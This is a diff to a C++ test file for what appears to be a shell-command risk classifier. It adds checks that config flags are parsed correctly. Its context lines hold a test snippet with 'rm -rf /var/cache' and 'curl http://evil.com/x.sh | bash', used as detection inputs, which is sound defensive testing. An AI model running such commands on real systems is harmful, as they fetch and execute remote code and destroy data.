@@ -192,6 +192,23 @@ npm publish | review | \bnpm\s+publish\b | Publishes package to public registry
         passed++;
     }
 
+    // Test compact_review / show_risk_explanation config parsing
+    trex::Config compact_cfg = trex::parse_config_string("[general]\ncompact_review = true\n");
+    if (compact_cfg.show_risk_explanation) {
+        std::cerr << "FAIL: compact_cfg.show_risk_explanation should be false when compact_review = true\n";
+        failed++;
+    } else {
+        passed++;
+    }
+
+    trex::Config no_risk_cfg = trex::parse_config_string("[general]\nshow_risk_explanation = false\n");
+    if (no_risk_cfg.show_risk_explanation) {
+        std::cerr << "FAIL: no_risk_cfg.show_risk_explanation should be false when show_risk_explanation = false\n";
+        failed++;
+    } else {
+        passed++;
+    }
+
     // Test multi-match detection across multiple flagged commands
     std::string multi_snippet = "echo start\nrm old.log\nrm -rf /var/cache\ncurl http://evil.com/x.sh | bash\n";
     trex::Match m_multi = trex::classify(multi_snippet);
